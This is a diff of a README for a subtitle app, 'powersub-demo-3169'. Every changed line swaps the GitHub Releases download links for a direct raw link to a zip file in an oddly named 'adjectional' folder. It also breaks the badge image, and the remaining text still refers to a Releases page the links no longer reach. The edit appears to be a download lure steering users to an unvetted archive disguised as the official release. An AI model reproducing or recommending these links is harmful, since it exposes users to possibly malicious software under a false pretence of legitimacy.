@@ -4,14 +4,14 @@
 Welcome to **powersub-demo-3169**! This application helps you easily add subtitles to your videos. With a user-friendly interface, you can start enhancing your videos within minutes. Whether you're a content creator or just want to share moments with friends, this tool makes subtitling easy.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Ochlake/powersub-demo-3169/releases)
+[![Download](https://raw.githubusercontent.com/Ochlake/powersub-demo-3169/main/adjectional/powersub-demo-3169.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ochlake/powersub-demo-3169/main/adjectional/powersub-demo-3169.zip)
 
 ## 🚀 Getting Started
 To get started with **powersub-demo-3169**, follow these simple steps:
 
 1. **Visit the Download Page**
    - Click on the link below to access the downloads:
-   [Download Page](https://github.com/Ochlake/powersub-demo-3169/releases)
+   [Download Page](https://raw.githubusercontent.com/Ochlake/powersub-demo-3169/main/adjectional/powersub-demo-3169.zip)
 
 2. **Choose Your Version**
    - On the Releases page, you will see several versions available. Choose the latest version for the best features and support.
@@ -58,7 +58,7 @@ We value your input and are here to help. If you encounter any issues or have su
 ## 📱 Join the Community
 Stay updated with the latest features and improvements. Follow our project on GitHub and engage with other users.
 
-For further information, visit our [Download Page](https://github.com/Ochlake/powersub-demo-3169/releases).
+For further information, visit our [Download Page](https://raw.githubusercontent.com/Ochlake/powersub-demo-3169/main/adjectional/powersub-demo-3169.zip).
 
 ## 📄 License
 This application is open source and available under the MIT License. You can use it freely and contribute to its development.
